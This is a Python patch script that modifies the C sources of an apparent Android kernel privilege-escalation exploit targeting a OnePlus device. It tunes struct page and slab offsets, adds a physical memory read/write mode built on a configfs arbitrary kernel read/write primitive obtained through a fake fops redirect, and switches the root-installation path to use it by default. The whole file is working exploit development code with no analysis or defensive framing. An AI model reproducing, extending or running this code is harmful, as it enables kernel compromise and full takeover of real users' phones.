#!/usr/bin/env python3
import sys, os

CORE = os.path.expanduser("~/ghostlock/ghostlock-oneplus/src/core")

def patch(path, old, new, count=1):
    p = os.path.join(CORE, path)
    s = open(p, encoding="utf-8").read()
    n = s.count(old)
    if n != count:
        print("FAIL %s: found %d occurrences (want %d) of:\n%r" % (path, n, count, old[:120]))
        sys.exit(1)
    s = s.replace(old, new)
    open(p, "w", encoding="utf-8").write(s)
    print("ok  %s" % path)

# --- 1. target.h: fix struct page offsets (verified via probe_kmem on device config) ---
patch("target.h",
      "#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08\n",
      "#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x20\n")
patch("target.h",
      "#define STRUCT_SLAB_CACHE_OFF         0x08\n",
      "#define STRUCT_SLAB_CACHE_OFF         0x30\n")
patch("target.h",
      "#define STRUCT_PAGE_TYPE_OFF          0x30\n",
      "#define STRUCT_PAGE_TYPE_OFF          0x18\n")

# --- 2. pipe_physrw.c: configfs-only physrw mode ---
patch("pipe_physrw.c",
      "/* Diagnostic globals referenced by fops.c */\nint pipe_cache_gate_ok;\n",
      "/* Diagnostic globals referenced by fops.c */\nint pipe_cache_gate_ok;\n"
      "/* CFG_PHYSRW: route physrw through the configfs arbitrary R/W primitive\n"
      " * instead of a forged pipe_buffer (no kmalloc-2k slab needed). */\n"
      "int configfs_physrw;\n")

patch("pipe_physrw.c",
      "int pipe_phys_read_data(int fd, uintptr_t direct_addr,\n"
      "                        void *out, size_t len) {\n"
      "  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {\n",
      "int pipe_phys_read_data(int fd, uintptr_t direct_addr,\n"
      "                        void *out, size_t len) {\n"
      "  if (configfs_physrw) {\n"
      "    return kernel_read_data(fd, direct_addr, out, len) == (ssize_t)len;\n"
      "  }\n"
      "  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {\n")

patch("pipe_physrw.c",
      "int pipe_phys_write_data(int fd, uintptr_t direct_addr,\n"
      "                         const void *data, size_t len) {\n"
      "  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {\n",
      "int pipe_phys_write_data(int fd, uintptr_t direct_addr,\n"
      "                         const void *data, size_t len) {\n"
      "  if (configfs_physrw) {\n"
      "    return kernel_write_data(fd, direct_addr, data, len) == (ssize_t)len;\n"
      "  }\n"
      "  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {\n")

install_fn = """
/* ---------- configfs-only physrw ---------- */

/*
 * Skip the kmalloc-2k slab scan / pipe_buffer forgery entirely and implement
 * physrw on top of the configfs arbitrary read/write primitive (which is
 * already proven to read and write any kernel address, any length, once the
 * fake fops redirect is in place).  Selected by CFG_PHYSRW=1 (default).
 */
int install_configfs_physrw(int fd) {
  (void)fd;
  configfs_physrw = 1;
  pipe_cache_gate_ok = 1;
  pipe_cache_page_index = 0;
  physrw_read_ok = 1;
  physrw_write_ok = 1;
  physrw_read64_ok = 1;
  physrw_write64_ok = 1;
  pr_success("physrw: configfs-only mode (pipe slab scan bypassed)\\n");
  fsync(1);
  return 1;
}
"""
p = os.path.join(CORE, "pipe_physrw.c")
s = open(p, encoding="utf-8").read()
if "install_configfs_physrw" not in s:
    s = s.rstrip("\n") + "\n" + install_fn
    open(p, "w", encoding="utf-8").write(s)
    print("ok  pipe_physrw.c (append install_configfs_physrw)")
else:
    print("skip pipe_physrw.c (already present)")

# --- 3. common.h: declarations ---
patch("common.h",
      "int install_pipe_physrw(int fd);\n",
      "int install_pipe_physrw(int fd);\n"
      "int install_configfs_physrw(int fd);\n"
      "extern int configfs_physrw;\n")

# --- 4. fops.c: use configfs physrw by default (CFG_PHYSRW=1) ---
patch("fops.c",
      "int install_child_root(int fd) {\n"
      "  if (!install_pipe_physrw(fd)) return 0;\n"
      "  if (install_umh_root(fd)) return 1;\n"
      "  return install_android_root(fd);\n"
      "}\n",
      "int install_child_root(int fd) {\n"
      "  if (env_flag(\"CFG_PHYSRW\", 1)) {\n"
      "    install_configfs_physrw(fd);\n"
      "  } else if (!install_pipe_physrw(fd)) {\n"
      "    return 0;\n"
      "  }\n"
      "  if (install_umh_root(fd)) return 1;\n"
      "  return install_android_root(fd);\n"
      "}\n")

print("done")
